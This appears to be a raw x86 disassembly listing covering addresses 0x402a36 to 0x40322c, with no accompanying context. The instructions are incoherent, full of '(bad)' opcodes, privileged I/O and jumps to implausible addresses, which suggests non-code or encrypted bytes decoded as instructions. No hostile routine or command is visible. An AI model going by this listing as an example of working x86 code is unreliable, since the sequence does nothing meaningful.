  402a36:	fcomp  QWORD PTR [edi-0x6a4998dc]
  402a3c:	jmp    0x4029fa
  402a3e:	jb     0x4029d0
  402a40:	(bad)  
  402a41:	hlt    
  402a42:	adc    al,0x1f
  402a44:	cmc    
  402a45:	mov    edx,0x6e24d848
  402a4a:	inc    esi
  402a4b:	bound  edx,QWORD PTR ds:0x6fc7ee10
  402a51:	shl    al,1
  402a53:	test   BYTE PTR [ecx+0xd20e927],dh
  402a59:	adc    esi,0xffffffe9
  402a5c:	aaa    
  402a5d:	lahf   
  402a5e:	mov    ?,WORD PTR [edx-0x6]
  402a61:	repz push esi
  402a63:	das    
  402a64:	popa   
  402a65:	(bad)
  402a69:	scas   eax,DWORD PTR es:[edi]
  402a6a:	fwait
  402a6b:	jne    0x402a65
  402a6d:	mov    fs,ecx
  402a6f:	mov    edx,0xeea7da76
  402a74:	push   ds
  402a75:	jecxz  0x402a5a
  402a77:	or     esp,0xffffffa4
  402a7a:	fwait
  402a7b:	gs inc esi
  402a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a7e:	ret    0x3e4a
  402a81:	addr16 ss push esp
  402a84:	add    bh,bh
  402a86:	mov    al,ds:0xe12822c9
  402a8b:	mov    ebx,DWORD PTR [ebp+0x54]
  402a8e:	xor    bh,BYTE PTR [eax+0x57bf65c4]
  402a94:	fisubr WORD PTR [eax-0xd]
  402a97:	inc    ecx
  402a98:	xchg   ecx,eax
  402a99:	or     al,0x3e
  402a9b:	push   ebx
  402a9c:	test   al,0xc6
  402a9e:	mov    ds:0x60592939,al
  402aa3:	mov    es,WORD PTR [edi-0x5a]
  402aa6:	mov    ds:0xc9d021a6,eax
  402aab:	pop    ebp
  402aac:	int3   
  402aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aae:	cmp    eax,DWORD PTR [edx+0x79]
  402ab1:	fisub  WORD PTR [edx+0x6387033e]
  402ab7:	std    
  402ab8:	je     0x402b12
  402aba:	leave  
  402abb:	aad    0xff
  402abd:	data16 jbe 0x402a81
  402ac0:	fs or  eax,0xb40f252b
  402ac6:	xor    dl,cl
  402ac8:	fidivr DWORD PTR [ecx]
  402aca:	mov    bl,BYTE PTR [ebp+0x5166452]
  402ad0:	xor    BYTE PTR [eax-0x51],0x31
  402ad4:	sub    BYTE PTR [esi],0xd
  402ad7:	or     al,0x67
  402ad9:	imul   esp,ecx,0xffffffb6
  402adc:	adc    ah,BYTE PTR [esi+0x4f]
  402adf:	mov    cl,0xfa
  402ae1:	sbb    al,0x66
  402ae3:	ins    DWORD PTR es:[edi],dx
  402ae4:	push   esp
  402ae5:	xchg   ecx,eax
  402ae6:	out    dx,eax
  402ae7:	mov    ecx,0xc347f6cf
  402aec:	dec    edi
  402aed:	push   0xfb0a67bd
  402af2:	clc    
  402af3:	and    ch,dh
  402af5:	jge    0x402b1a
  402af7:	or     DWORD PTR [esi+0x58],esi
  402afa:	call   0xde9941f6
  402aff:	inc    esi
  402b00:	sub    eax,0x2afcbcf0
  402b05:	push   cs
  402b06:	jne    0x402b3d
  402b08:	cmp    DWORD PTR [ebx+eiz*8-0x79ff177b],ecx
  402b0f:	or     eax,0x3119edcb
  402b14:	hlt    
  402b15:	xchg   edi,eax
  402b16:	and    ebx,edi
  402b18:	clc    
  402b19:	cs pop es
  402b1b:	lods   al,BYTE PTR ds:[esi]
  402b1c:	cmp    eax,0x93a7dab8
  402b21:	mov    bh,0x51
  402b23:	or     dl,BYTE PTR [edx-0x7dcdd5e]
  402b29:	inc    ebp
  402b2a:	imul   ecx,DWORD PTR [ebx+0x2b9f20f3],0xee3a141d
  402b34:	push   eax
  402b35:	jo     0x402b98
  402b37:	(bad)  
  402b38:	jmp    0xc503:0xa316598
  402b3f:	and    eax,0xdcd1c869
  402b44:	gs fwait
  402b46:	push   ss
  402b47:	sub    DWORD PTR [edi+0x5047cbfd],ecx
  402b4d:	mov    ebx,0x4171c418
  402b52:	jge    0x402b2c
  402b54:	popa   
  402b55:	xor    BYTE PTR [esi],dh
  402b57:	add    ch,BYTE PTR [ebx-0x30]
  402b5a:	scas   al,BYTE PTR es:[edi]
  402b5b:	dec    edx
  402b5c:	(bad)  
  402b5d:	mov    cl,0x5b
  402b5f:	repnz or DWORD PTR [ebp+edx*2-0x8],0x7
  402b65:	in     eax,0x45
  402b67:	enter  0x671e,0x28
  402b6b:	add    BYTE PTR [esi-0x42259829],bh
  402b71:	jb     0x402bd2
  402b73:	pop    ss
  402b74:	cld    
  402b75:	cmp    al,0x2b
  402b77:	mov    ds:0x9e0806d9,al
  402b7c:	aam    0x8e
  402b7e:	cmp    bl,BYTE PTR [esi]
  402b80:	stos   BYTE PTR es:[edi],al
  402b81:	stos   BYTE PTR es:[edi],al
  402b82:	mov    esp,ss
  402b84:	call   0xa6f1750a
  402b89:	(bad)  
  402b8a:	das    
  402b8b:	or     ebp,DWORD PTR [ebp-0x4f]
  402b8e:	in     al,dx
  402b8f:	sbb    al,BYTE PTR [ecx+esi*1]
  402b92:	in     al,0x7
  402b94:	adc    bl,BYTE PTR [ecx+eax*4-0x6db05a99]
  402b9b:	bound  eax,QWORD PTR [ebx]
  402b9d:	pop    edx
  402b9e:	aam    0x4b
  402ba0:	jbe    0x402b42
  402ba2:	inc    ecx
  402ba3:	pop    eax
  402ba4:	jo     0x402c19
  402ba6:	mov    al,al
  402ba8:	jl     0x402bd8
  402baa:	in     eax,0x47
  402bac:	jb     0x402b48
  402bae:	mov    cl,0x23
  402bb0:	jl     0x402c00
  402bb2:	int    0xdc
  402bb4:	xor    ecx,edx
  402bb6:	push   0xfa8b11cc
  402bbb:	data16 es int 0xa7
  402bbf:	hlt    
  402bc0:	(bad)  
  402bc2:	popf   
  402bc3:	jle    0x402c14
  402bc5:	ss cmp al,0x30
  402bc8:	(bad)  
  402bc9:	scas   al,BYTE PTR es:[edi]
  402bca:	cs mov esi,0xa1b9f658
  402bd0:	jecxz  0x402c50
  402bd2:	xchg   edx,eax
  402bd3:	stos   BYTE PTR es:[edi],al
  402bd4:	rcr    DWORD PTR [ecx-0x4244666b],1
  402bda:	js     0x402bc0
  402bdc:	das    
  402bdd:	mov    ecx,0xf441a5fc
  402be2:	test   DWORD PTR [esi+esi*8+0x7f],ecx
  402be6:	or     ecx,esp
  402be8:	out    dx,al
  402be9:	add    edi,esp
  402beb:	pop    edx
  402bec:	mov    esp,0x7d3ea6f1
  402bf1:	test   DWORD PTR [edi+0x182aaaf5],edx
  402bf7:	into   
  402bf8:	lock fidivr DWORD PTR [edi+ebp*2-0x30529a37]
  402c00:	imul   esi,DWORD PTR [ecx+ecx*4-0x353037f5],0xffffffb8
  402c08:	imul   ebx,DWORD PTR [edi-0x3935d7e],0x3d
  402c0f:	mov    dh,al
  402c11:	adc    al,0xe5
  402c13:	sbb    DWORD PTR [edx+ebx*1-0x37e1c0c],ebp
  402c1a:	mov    cl,0x2a
  402c1c:	inc    edx
  402c1d:	inc    esp
  402c1e:	mov    DWORD PTR [eax],edi
  402c20:	jns    0x402be7
  402c22:	into   
  402c23:	fwait
  402c24:	xor    esi,esi
  402c26:	test   DWORD PTR [ebp+eax*8-0x317bf52a],ecx
  402c2d:	push   0x0
  402c2f:	push   es
  402c30:	mov    bh,0x59
  402c32:	cmp    BYTE PTR [ecx-0x4e13dd23],dh
  402c38:	or     eax,0xc6e7d0ff
  402c3d:	jmp    0x817b27af
  402c42:	xor    dh,0xc5
  402c45:	mov    eax,ds:0x9775f5c1
  402c4a:	idiv   DWORD PTR [ebp-0x6]
  402c4d:	ja     0x402c4f
  402c4f:	xchg   edi,eax
  402c50:	sbb    al,0x8e
  402c52:	push   esi
  402c53:	not    DWORD PTR [edi+ebp*4-0x65]
  402c57:	sti    
  402c58:	mov    ds:0x976e9392,eax
  402c5d:	div    DWORD PTR [ebx-0x7b]
  402c60:	in     al,0xa7
  402c62:	outs   dx,DWORD PTR ds:[esi]
  402c63:	inc    eax
  402c64:	xchg   ecx,eax
  402c65:	pop    ds
  402c66:	add    esp,edx
  402c68:	lds    edx,FWORD PTR [edx+eiz*2]
  402c6b:	mov    eax,0x20fe1431
  402c70:	cli    
  402c71:	retf   0xa988
  402c74:	fmul   QWORD PTR [esi]
  402c76:	adc    eax,0x63bec133
  402c7b:	lods   al,BYTE PTR ds:[esi]
  402c7c:	sar    DWORD PTR [ebx-0x40f8a5d6],0x1b
  402c83:	das    
  402c84:	popa   
  402c85:	test   BYTE PTR [ebx-0x62],ch
  402c88:	lahf   
  402c89:	gs inc ecx
  402c8b:	jmp    0x19c2d5f0
  402c90:	xchg   esi,eax
  402c91:	fmul   DWORD PTR [edi-0x2b1ba0b5]
  402c97:	fisub  DWORD PTR [edx-0x60]
  402c9a:	mov    edi,0x7c62b3ab
  402c9f:	ror    DWORD PTR [ebx-0x28],1
  402ca2:	lahf   
  402ca3:	mov    DWORD PTR [eax+esi*8],ebx
  402ca6:	ret    0xc136
  402ca9:	or     eax,edi
  402cab:	mov    eax,0xbbe9ab8c
  402cb0:	sbb    eax,0x2ca24bf6
  402cb5:	inc    ecx
  402cb6:	test   eax,0xb4df86b5
  402cbb:	mov    bh,0x5
  402cbd:	xchg   edi,eax
  402cbe:	rol    DWORD PTR [ecx],0xb0
  402cc1:	dec    esp
  402cc2:	push   0x24
  402cc4:	or     BYTE PTR [edx-0x4da66ea4],ch
  402cca:	sub    eax,0xc9a1df98
  402ccf:	mov    ebx,0xf25e4b7
  402cd4:	pop    ecx
  402cd5:	clc    
  402cd6:	(bad)  
  402cd7:	aad    0x39
  402cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cda:	loopne 0x402cde
  402cdc:	pop    esi
  402cdd:	adc    DWORD PTR [ecx+0x4b81e836],esi
  402ce3:	mov    eax,0x9bc1e780
  402ce8:	shr    DWORD PTR fs:[edi-0x3101fa18],1
  402cef:	ja     0x402c92
  402cf1:	js     0x402d68
  402cf3:	push   0x1a2eeaf8
  402cf8:	stc    
  402cf9:	out    0xa8,eax
  402cfb:	xlat   BYTE PTR ds:[ebx]
  402cfc:	daa    
  402cfd:	sar    al,cl
  402cff:	jae    0x402ce1
  402d01:	cmp    cl,al
  402d03:	adc    BYTE PTR ds:0xf2d833fc,bl
  402d09:	cmp    al,0xf6
  402d0b:	cdq    
  402d0c:	in     eax,0x9
  402d0e:	adc    bl,bl
  402d10:	ins    BYTE PTR es:[edi],dx
  402d11:	jmp    0x6076:0xd463d49f
  402d18:	xchg   esp,eax
  402d19:	push   ebx
  402d1a:	in     eax,0xa
  402d1c:	add    dl,BYTE PTR [ecx]
  402d1e:	push   edx
  402d1f:	adc    BYTE PTR [ecx-0x1e10aa3],dl
  402d25:	pop    ebx
  402d26:	mov    bl,0x35
  402d28:	icebp  
  402d29:	aaa    
  402d2a:	bound  eax,QWORD PTR [edi+eiz*1+0x535a71b1]
  402d31:	jo     0x402cce
  402d33:	fsub   QWORD PTR [ecx-0x42]
  402d36:	jp     0x402d7d
  402d38:	pop    ds
  402d39:	pop    eax
  402d3a:	test   al,0xfb
  402d3c:	dec    eax
  402d3d:	mov    ah,ch
  402d3f:	jmp    0x10f7e51e
  402d44:	fs js  0x402d44
  402d47:	out    0x4,al
  402d49:	push   0xf016632e
  402d4e:	popa   
  402d4f:	pop    edx
  402d50:	ret    0x9bb8
  402d53:	xor    al,0x7f
  402d55:	in     al,0x7
  402d57:	leave  
  402d58:	mov    ah,0x4d
  402d5a:	pop    edx
  402d5b:	fninit 
  402d5d:	in     al,0xd8
  402d5f:	shl    eax,1
  402d61:	xchg   esi,eax
  402d62:	dec    ecx
  402d63:	sbb    DWORD PTR [edi],ebx
  402d65:	arpl   cx,sp
  402d67:	push   esp
  402d68:	fmulp  st(6),st
  402d6a:	fwait
  402d6b:	scas   al,BYTE PTR es:[edi]
  402d6c:	lahf   
  402d6d:	shl    al,cl
  402d6f:	in     eax,dx
  402d70:	test   ah,dl
  402d72:	fs call 0x599e:0xd27b6ca4
  402d7a:	cwde   
  402d7b:	leave  
  402d7c:	dec    eax
  402d7d:	and    al,0x62
  402d7f:	fist   DWORD PTR [eax]
  402d81:	xchg   edi,eax
  402d82:	stos   DWORD PTR es:[edi],eax
  402d83:	push   ds
  402d84:	pop    edx
  402d85:	push   cs
  402d86:	lock rcl BYTE PTR [edi],1
  402d89:	fst    QWORD PTR [ecx]
  402d8b:	stos   BYTE PTR es:[edi],al
  402d8c:	(bad)  
  402d8d:	popa   
  402d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d8f:	ins    DWORD PTR es:[edi],dx
  402d90:	ret    0x247d
  402d93:	cmp    al,0x3f
  402d95:	push   ebp
  402d96:	add    ebp,0x604b38c0
  402d9c:	xchg   ebx,eax
  402d9d:	ret    0xe2fa
  402da0:	sti    
  402da1:	mov    ch,BYTE PTR [esi]
  402da3:	ret    
  402da4:	mov    esp,DWORD PTR [edi]
  402da6:	xchg   esp,eax
  402da7:	pop    ss
  402da8:	pushf  
  402da9:	sbb    BYTE PTR [edi+0x11b561bf],0xba
  402db0:	push   ds
  402db1:	and    ebx,ecx
  402db3:	packuswb mm1,QWORD PTR [eax+ecx*2-0x67]
  402db8:	inc    ebp
  402db9:	lock rcl BYTE PTR [ebx],1
  402dbc:	mov    edx,0x85e68c23
  402dc1:	and    DWORD PTR [ebx],esp
  402dc3:	pusha  
  402dc4:	int3   
  402dc5:	es push ebp
  402dc7:	fisub  DWORD PTR [ebp-0x70]
  402dca:	add    dl,0xe6
  402dcd:	aas    
  402dce:	pop    edi
  402dcf:	mov    dh,0x75
  402dd1:	add    DWORD PTR [esp+edi*2-0x4a1ffd11],esp
  402dd8:	xchg   edx,eax
  402dd9:	inc    edi
  402dda:	jae    0x402e57
  402ddc:	lods   al,BYTE PTR ds:[esi]
  402ddd:	inc    edx
  402dde:	fdivr  QWORD PTR [edx+0x75478a8f]
  402de4:	mov    eax,ds:0xc714478
  402de9:	in     al,dx
  402dea:	lods   al,BYTE PTR ds:[esi]
  402deb:	aaa    
  402dec:	repnz sbb bl,BYTE PTR [esi+0x76]
  402df0:	add    eax,0x4cc3dee4
  402df5:	pop    esi
  402df6:	cwde   
  402df7:	jmp    0x402e2a
  402df9:	retf   
  402dfa:	mov    eax,0xf9822f2a
  402dff:	xor    DWORD PTR [edi],esi
  402e01:	sti    
  402e02:	(bad)  
  402e04:	and    ecx,DWORD PTR [edx-0x72]
  402e07:	jge    0x402e86
  402e09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e0a:	adc    ebp,edi
  402e0c:	(bad)  
  402e0e:	dec    ecx
  402e0f:	icebp  
  402e10:	int    0x84
  402e12:	inc    ebx
  402e13:	in     al,dx
  402e14:	mov    edi,0x5cb1ed0f
  402e19:	xchg   esp,eax
  402e1a:	pop    es
  402e1b:	jmp    0x2bbafe89
  402e20:	imul   edx,edi,0x8363974f
  402e26:	jnp    0x402e2a
  402e28:	js     0x402e36
  402e2a:	ror    BYTE PTR [ebx-0x1f7d2450],cl
  402e30:	inc    edx
  402e31:	out    0x68,eax
  402e33:	stc    
  402e34:	inc    ebp
  402e35:	fld    TBYTE PTR [eax+0x2c52e7f0]
  402e3b:	adc    eax,0x96d19288
  402e40:	and    ebx,ebx
  402e42:	pop    edx
  402e43:	push   esi
  402e44:	cmc    
  402e45:	fnsetpm(287 only) 
  402e47:	inc    ebx
  402e48:	or     eax,0x8071dd08
  402e4d:	ret    
  402e4e:	cs cdq 
  402e50:	dec    ecx
  402e51:	test   DWORD PTR [ecx+0x2dd88b63],edi
  402e57:	outs   dx,DWORD PTR ds:[esi]
  402e58:	push   cs
  402e59:	adc    BYTE PTR [ecx-0x264245c5],dh
  402e5f:	mov    eax,ds:0xa07899a2
  402e64:	jns    0x402e42
  402e66:	aad    0xc2
  402e68:	ds adc dl,0xe9
  402e6c:	push   ecx
  402e6d:	add    bh,BYTE PTR [ebx-0x4a5af3d0]
  402e73:	inc    DWORD PTR [edi-0x18]
  402e76:	xor    al,0xdd
  402e78:	add    ebp,DWORD PTR [eax+0x29]
  402e7b:	push   ecx
  402e7c:	jnp    0x402e26
  402e7e:	cwde   
  402e7f:	std    
  402e80:	les    esp,FWORD PTR [edi+0xf]
  402e83:	xchg   edx,eax
  402e84:	js     0x402e53
  402e86:	jmp    0x44d8247f
  402e8b:	dec    ebx
  402e8c:	(bad)  
  402e8d:	pop    ebp
  402e8e:	pop    ecx
  402e8f:	daa    
  402e90:	bnd jmp 0x402e75
  402e93:	outs   dx,DWORD PTR ds:[esi]
  402e94:	lods   eax,DWORD PTR ds:[esi]
  402e95:	jmp    0x402e94
  402e97:	jb     0x402ea6
  402e99:	mov    cl,0x2b
  402e9b:	mov    edx,0x9802d364
  402ea0:	push   es
  402ea1:	(bad)  
  402ea4:	dec    edi
  402ea5:	rcr    DWORD PTR [ebx-0x3e],1
  402ea8:	push   0x7bb23331
  402ead:	inc    ebx
  402eae:	ret    
  402eaf:	dec    DWORD PTR [ebp+0x38f33be4]
  402eb5:	jnp    0x402f04
  402eb7:	and    bh,bl
  402eb9:	mov    ds:0x18d0d38c,al
  402ebe:	mov    dh,0x5c
  402ec0:	add    eax,DWORD PTR [eax]
  402ec2:	mov    bh,0x4e
  402ec4:	stc    
  402ec5:	inc    eax
  402ec6:	pop    esi
  402ec7:	adc    DWORD PTR [eax+edi*8],eax
  402eca:	jg     0x402e67
  402ecc:	and    BYTE PTR [ecx+0x7d],ch
  402ecf:	push   ebx
  402ed0:	pushf  
  402ed1:	xor    BYTE PTR [edi+0x4b],0x35
  402ed5:	mov    esp,0x7c68162e
  402eda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402edb:	shl    BYTE PTR ds:0x83c789ae,cl
  402ee1:	gs fcmovnb st,st(7)
  402ee4:	mov    esp,0xafd62fdd
  402ee9:	mov    esp,0x681d0a7c
  402eee:	pop    edi
  402eef:	retf   
  402ef0:	popa   
  402ef1:	in     al,dx
  402ef2:	cs repnz mov edi,0x9c49eb95
  402ef9:	cdq    
  402efa:	(bad)  
  402efb:	clc    
  402efc:	shr    DWORD PTR [ebx+ebx*8-0x5b],0x29
  402f01:	pop    ds
  402f02:	test   BYTE PTR ds:0xa1c35ea4,bl
  402f08:	sub    al,0x1a
  402f0a:	jns    0x402e8e
  402f0c:	ret    0xd39c
  402f0f:	hlt    
  402f10:	push   0xfe57bbbd
  402f15:	mov    bh,0xae
  402f17:	cdq    
  402f18:	std    
  402f19:	and    edi,DWORD PTR [ebp-0xf]
  402f1c:	jbe    0x402f7b
  402f1e:	sbb    al,0xe5
  402f20:	xchg   esp,eax
  402f21:	(bad)
  402f24:	lea    esi,[edx+0x21]
  402f27:	mov    DWORD PTR ds:0x88e55cc4,eax
  402f2d:	pop    esi
  402f2e:	inc    edx
  402f2f:	add    BYTE PTR [eax-0x23],dh
  402f32:	push   ds
  402f33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f34:	dec    edx
  402f35:	mov    gs,WORD PTR [edi-0x51aa3b08]
  402f3b:	or     edx,DWORD PTR [edx+0x256ed63e]
  402f41:	pop    ebp
  402f42:	jmp    0x9264821b
  402f47:	sbb    al,al
  402f49:	(bad)  
  402f4a:	mov    DWORD PTR ds:0xb4f2f083,esp
  402f50:	rcr    DWORD PTR [edi-0x47],0x24
  402f54:	add    BYTE PTR [esi],ah
  402f56:	add    DWORD PTR [edx-0x59],ebp
  402f59:	sahf   
  402f5a:	into   
  402f5b:	mov    bl,0x18
  402f5d:	fisttp QWORD PTR [eax+edx*1+0x538759c9]
  402f64:	add    DWORD PTR [ecx+0x7b],ebx
  402f67:	daa    
  402f68:	push   edx
  402f69:	lods   al,BYTE PTR ds:[esi]
  402f6a:	cmp    esp,ecx
  402f6c:	imul   edi,DWORD PTR [edx+0x32],0x99472424
  402f73:	popf   
  402f74:	icebp  
  402f75:	jl     0x402fd1
  402f77:	fwait
  402f78:	jge    0x402ff0
  402f7a:	adc    al,0x6f
  402f7c:	pop    ebx
  402f7d:	inc    esp
  402f7e:	shl    DWORD PTR [ecx],0xb
  402f81:	std    
  402f82:	jbe    0x402ffe
  402f84:	iret   
  402f85:	call   0xd333c55d
  402f8a:	ror    bl,0x74
  402f8d:	mov    bl,0x63
  402f8f:	aam    0xdc
  402f91:	pop    edi
  402f92:	pop    ds
  402f93:	mov    ah,0xa3
  402f95:	dec    esi
  402f96:	dec    esp
  402f97:	cld    
  402f98:	(bad)  
  402f99:	and    eax,DWORD PTR [ebp-0x1f]
  402f9c:	shl    DWORD PTR [ebx-0x64],cl
  402f9f:	dec    esp
  402fa0:	and    ah,BYTE PTR [ecx-0x107b04f4]
  402fa6:	fidiv  DWORD PTR ds:0x823169ed
  402fac:	cmp    ecx,DWORD PTR [ecx+0x4aeee1ba]
  402fb2:	add    BYTE PTR [edx],dh
  402fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fb5:	in     eax,0xf
  402fb7:	mov    edi,0x63f2f4c2
  402fbc:	cdq    
  402fbd:	jns    0x403018
  402fbf:	adc    esi,DWORD PTR [ebp+0x1c492877]
  402fc5:	mov    ecx,0x5d179e0f
  402fca:	add    eax,0x863e463d
  402fcf:	inc    ecx
  402fd0:	and    bl,ch
  402fd2:	popa   
  402fd3:	mov    cl,ah
  402fd5:	dec    edx
  402fd6:	mov    edi,0xcea91fb9
  402fdb:	outs   dx,BYTE PTR ds:[esi]
  402fdc:	or     bl,BYTE PTR [ecx-0x1f]
  402fdf:	int    0x4e
  402fe1:	sub    esi,DWORD PTR [ebx]
  402fe3:	mov    ah,0x26
  402fe5:	xor    ecx,esp
  402fe7:	push   eax
  402fe8:	mov    eax,ds:0x7a955bb3
  402fed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fee:	fwait
  402fef:	nop
  402ff0:	xchg   edi,eax
  402ff1:	and    DWORD PTR [esp+edx*4],0xffffffd4
  402ff5:	mov    eax,0x6567252f
  402ffa:	fild   DWORD PTR [ebx]
  402ffc:	adc    ah,ah
  402ffe:	adc    dh,BYTE PTR [ebp-0x13]
  403001:	test   eax,0x9f47cb3b
  403006:	adc    dh,BYTE PTR [ecx+0x0]
  403009:	out    0xc9,eax
  40300b:	test   al,0xfb
  40300d:	(bad)  
  40300e:	adc    dh,BYTE PTR [edi-0xe]
  403011:	jnp    0x40307d
  403013:	retf   0x363b
  403016:	mov    ebp,0xb154bbea
  40301b:	add    eax,0xe05c25a5
  403020:	jnp    0x403032
  403022:	mov    ebx,0x377d7c4e
  403027:	and    eax,0x431d8312
  40302c:	or     DWORD PTR [eax],edi
  40302e:	add    ah,BYTE PTR [ebp-0x2e]
  403031:	(bad)  
  403032:	sar    BYTE PTR [eax+esi*8+0x53],1
  403036:	es ret 0xb097
  40303a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40303b:	dec    esp
  40303c:	std    
  40303d:	(bad)  [esi]
  40303f:	(bad)  
  403040:	out    0xd,al
  403042:	pop    esi
  403043:	int    0xe
  403045:	cmc    
  403046:	imul   BYTE PTR [ebp-0x7911469a]
  40304c:	rcl    BYTE PTR [esi+ebp*2+0x67e6e201],0xbf
  403054:	inc    esp
  403055:	cmp    dh,ch
  403057:	fwait
  403058:	adc    edi,0xb2c20021
  40305e:	xchg   edi,eax
  40305f:	ret    0x32d9
  403062:	pop    ebp
  403063:	pop    ecx
  403064:	jp     0x403073
  403066:	fisub  DWORD PTR [esp+eax*8]
  403069:	dec    ebx
  40306a:	xor    ebp,esp
  40306c:	(bad)  
  40306d:	jmp    0x6dc3e85e
  403072:	popf   
  403073:	gs lahf 
  403075:	jno    0x40300f
  403077:	xchg   esp,eax
  403078:	jno    0x403058
  40307a:	and    eax,0xc177706
  40307f:	cld    
  403080:	inc    esp
  403081:	mov    ah,0xad
  403083:	scas   al,BYTE PTR es:[edi]
  403084:	shld   WORD PTR gs:[edx],bp,cl
  403089:	xchg   DWORD PTR [esp+eiz*8],ebx
  40308c:	(bad)  
  40308d:	in     eax,dx
  40308e:	stc    
  40308f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403090:	loope  0x40306c
  403092:	mov    esp,ebp
  403094:	inc    edx
  403095:	gs mov ah,0xa0
  403098:	repnz inc ebp
  40309a:	ret    
  40309b:	test   eax,0x695adf06
  4030a0:	js     0x4030db
  4030a2:	jle    0x40310e
  4030a4:	mov    esi,0x136edd4
  4030a9:	add    ah,dl
  4030ab:	ss test al,0xbb
  4030ae:	pop    ebx
  4030af:	(bad)  
  4030b0:	mov    dl,0x28
  4030b2:	outs   dx,BYTE PTR ds:[esi]
  4030b3:	lock jg 0x4030c2
  4030b6:	jmp    0x4030ab
  4030b8:	and    dh,BYTE PTR [ebx]
  4030ba:	jmp    FWORD PTR [edx+0x3c7a3dc3]
  4030c0:	mov    esp,0x85ce6c90
  4030c5:	xchg   ecx,eax
  4030c6:	cmp    DWORD PTR [edi],ecx
  4030c8:	ins    DWORD PTR es:[edi],dx
  4030c9:	(bad)  
  4030ca:	leave  
  4030cb:	daa    
  4030cc:	xchg   ebx,eax
  4030cd:	mov    al,ds:0x6e22eab1
  4030d2:	int3   
  4030d3:	shr    DWORD PTR [edi+0xc63922d],cl
  4030d9:	fwait
  4030da:	lods   eax,DWORD PTR ds:[esi]
  4030db:	pop    es
  4030dc:	lods   al,BYTE PTR ds:[esi]
  4030dd:	sahf   
  4030de:	or     eax,esp
  4030e0:	mov    esp,0xc112e7fc
  4030e5:	cs mov ch,0x6f
  4030e8:	sbb    eax,edx
  4030ea:	and    DWORD PTR [edi-0x33],0xa669a596
  4030f1:	or     cx,WORD PTR [eax]
  4030f4:	sub    eax,0x388393ce
  4030f9:	ficom  DWORD PTR [ebp+0x21f023ce]
  4030ff:	adc    eax,0xc134778d
  403104:	or     DWORD PTR [edx+esi*4-0x416c6dc3],edx
  40310b:	add    al,0x9c
  40310d:	push   0xbe089c06
  403112:	push   edx
  403113:	ins    DWORD PTR es:[edi],dx
  403114:	push   es
  403115:	pop    ds
  403116:	shl    ecx,0x70
  403119:	add    al,0x6e
  40311b:	dec    ebp
  40311c:	jno    0x40317a
  40311e:	xchg   ebp,eax
  40311f:	jge    0x4030c0
  403121:	aaa    
  403122:	popa   
  403123:	scas   al,BYTE PTR es:[edi]
  403124:	xchg   ebp,eax
  403125:	call   0x1c22:0xb71cbe1c
  40312c:	mov    ebx,0x99bb6bae
  403131:	mov    eax,ds:0x4600563
  403136:	jbe    0x4031b4
  403138:	pop    ebx
  403139:	sbb    al,0xc3
  40313b:	adc    al,0xc1
  40313d:	sbb    eax,0x91a49335
  403142:	jp     0xea0cd0c4
  403148:	lds    edx,FWORD PTR [ebp-0x26b51839]
  40314e:	stc    
  40314f:	xchg   edx,eax
  403150:	mov    ah,0x6a
  403152:	daa    
  403153:	test   eax,0x3736d249
  403158:	push   0xffffff85
  40315a:	mov    ch,0x27
  40315c:	mov    edi,0x64ae95db
  403161:	sbb    DWORD PTR [esp+edx*2-0x63],ecx
  403165:	mov    DWORD PTR [ebp+0x63dfe076],edi
  40316b:	sti    
  40316c:	cwde   
  40316d:	lahf   
  40316e:	jae    0x4031ef
  403170:	sahf   
  403171:	in     al,0xbb
  403173:	fist   WORD PTR [ecx+0x4c0b8957]
  403179:	jl     0x403104
  40317b:	and    eax,0xa399824d
  403180:	clc    
  403181:	push   ds
  403182:	sahf   
  403183:	sbb    eax,0x48045177
  403188:	add    eax,0x22278ac6
  40318d:	mov    ebp,0x585f4d90
  403192:	dec    esp
  403193:	popa   
  403194:	data16 cs daa 
  403197:	sub    dl,BYTE PTR cs:[edi]
  40319a:	push   ebp
  40319b:	icebp  
  40319c:	repnz (bad) 
  40319e:	mov    bh,0x92
  4031a0:	add    eax,DWORD PTR [ebp+0x5c]
  4031a3:	push   ds
  4031a4:	adc    al,0x91
  4031a6:	in     al,0x15
  4031a8:	imul   ecx,DWORD PTR [edx],0x9e81b3c
  4031ae:	pop    esp
  4031af:	and    DWORD PTR [esi],0xdb8c7387
  4031b5:	ficomp WORD PTR [ebx]
  4031b7:	pop    edi
  4031b8:	int3   
  4031b9:	inc    edx
  4031ba:	call   0x96ed:0xf2e145a5
  4031c1:	adc    ebx,0x69
  4031c4:	xor    dh,cl
  4031c6:	psllw  mm6,mm6
  4031c9:	in     eax,dx
  4031ca:	cs int3 
  4031cc:	mov    BYTE PTR [edx-0xd],bh
  4031cf:	push   edx
  4031d0:	addr16 data16 hlt 
  4031d3:	enter  0xafe1,0x62
  4031d7:	cmp    esp,DWORD PTR [esi-0x12aa3903]
  4031dd:	and    cl,BYTE PTR [edi]
  4031df:	mov    eax,0x2c1f7303
  4031e4:	add    edi,eax
  4031e6:	cmp    al,0xc9
  4031e8:	fsub   st(1),st
  4031ea:	cmp    eax,DWORD PTR [ebx+0x68]
  4031ed:	mov    WORD PTR [edi-0x2964796f],ss
  4031f3:	outs   dx,BYTE PTR ds:[esi]
  4031f4:	pop    es
  4031f5:	enter  0x7a36,0x62
  4031f9:	push   ebp
  4031fa:	dec    ecx
  4031fb:	ficom  WORD PTR [eax-0x6cf1cea4]
  403201:	pop    ebx
  403202:	cmp    BYTE PTR [esp+eiz*2+0x49],0xd
  403207:	(bad)  [edx+0x2e4b41cd]
  40320d:	mov    al,0x6e
  40320f:	push   eax
  403210:	(bad)  
  403211:	jge    0x4031a2
  403213:	ss mov ch,0x9d
  403216:	stc    
  403217:	pop    edi
  403218:	sahf   
  403219:	fnsave [esi-0x4302d1ce]
  40321f:	ret    
  403220:	inc    esp
  403221:	arpl   WORD PTR ds:0xcaf38d46,ax
  403227:	es jb  0x4031ef
  40322a:	aam    0xe3
  40322c:	aam    0x98
